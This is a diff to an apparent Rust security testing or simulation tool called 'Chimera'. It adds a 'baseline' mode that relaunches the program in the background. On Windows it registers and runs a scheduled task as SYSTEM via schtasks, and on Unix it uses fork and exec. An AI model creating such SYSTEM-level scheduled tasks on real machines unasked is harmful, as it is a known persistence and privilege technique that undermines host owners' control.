@@ -18,6 +18,107 @@ use std::fs::{self, File};
 use std::io::Write;
 use std::path::Path;
 
+pub async fn run_baseline() -> ExecutionResult {
+    let current_exe = std::env::current_exe().expect("Failed to get current executable path");
+
+    #[cfg(windows)]
+    {
+        // Windows-specific implementation using schtasks
+        let task_name = "ChimeraBaseline";
+        let current_exe_str = current_exe.to_string_lossy();
+
+        // Create and run the scheduled task
+        let create_result = tokio::process::Command::new("schtasks")
+            .args(&[
+                "/create",
+                "/tn",
+                task_name,
+                "/tr",
+                &format!("\"{}\" baseline", current_exe_str),
+                "/sc",
+                "once",
+                "/st",
+                &chrono::Local::now().format("%H:%M").to_string(),
+                "/f",
+                "/ru",
+                "System",
+            ])
+            .output()
+            .await;
+
+        match create_result {
+            Ok(_) => {
+                // Run the task
+                let run_result = tokio::process::Command::new("schtasks")
+                    .args(&["/run", "/tn", task_name])
+                    .output()
+                    .await;
+
+                match run_result {
+                    Ok(_) => ExecutionResult::new(
+                        ExecutionMode::Baseline,
+                        true,
+                        "Baseline started in background".to_string(),
+                    ),
+                    Err(e) => {
+                        error!("Failed to run baseline scheduled task: {}", e);
+                        ExecutionResult::new(
+                            ExecutionMode::Baseline,
+                            false,
+                            format!("Failed to run baseline scheduled task: {}", e),
+                        )
+                    }
+                }
+            }
+            Err(e) => {
+                error!("Failed to create baseline scheduled task: {}", e);
+                ExecutionResult::new(
+                    ExecutionMode::Baseline,
+                    false,
+                    format!("Failed to create baseline scheduled task: {}", e),
+                )
+            }
+        }
+    }
+
+    #[cfg(unix)]
+    {
+        use nix::unistd::execvp;
+        use nix::unistd::{fork, ForkResult};
+        use std::ffi::CString;
+
+        match unsafe { fork() } {
+            Ok(ForkResult::Parent { child: _ }) => ExecutionResult::new(
+                ExecutionMode::Baseline,
+                true,
+                "Baseline started in background".to_string(),
+            ),
+            Ok(ForkResult::Child) => {
+                // Convert the executable path and arguments to CString
+                let exe = CString::new(current_exe.to_str().unwrap()).unwrap();
+                let arg0 = CString::new("baseline").unwrap();
+
+                // Replace the current process with baseline
+                match execvp(&exe, &[&exe, &arg0]) {
+                    Ok(_) => unreachable!(), // execvp never returns on success
+                    Err(e) => {
+                        error!("Failed to exec baseline: {}", e);
+                        std::process::exit(1);
+                    }
+                }
+            }
+            Err(e) => {
+                error!("Failed to fork baseline process: {}", e);
+                ExecutionResult::new(
+                    ExecutionMode::Baseline,
+                    false,
+                    format!("Failed to fork baseline process: {}", e),
+                )
+            }
+        }
+    }
+}
+
 async fn run_serve_mode(port: u16) -> ExecutionResult {
     let mode = ServeMode::new();
     info!("Starting serve mode on port {}", port);
@@ -96,9 +197,9 @@ async fn run_all_modes(output_dir: &Path, magic_value: u32) {
     let results = [
         run_credentials_mode(magic_value).await,
         run_inventory_mode(output_dir).await,
-        //run_baseline_mode().await,
         run_update_mode().await,
         run_serve_mode(44372).await,
+        run_baseline().await,
     ];
 
     let all_succeeded = results.iter().all(|r| r.success);
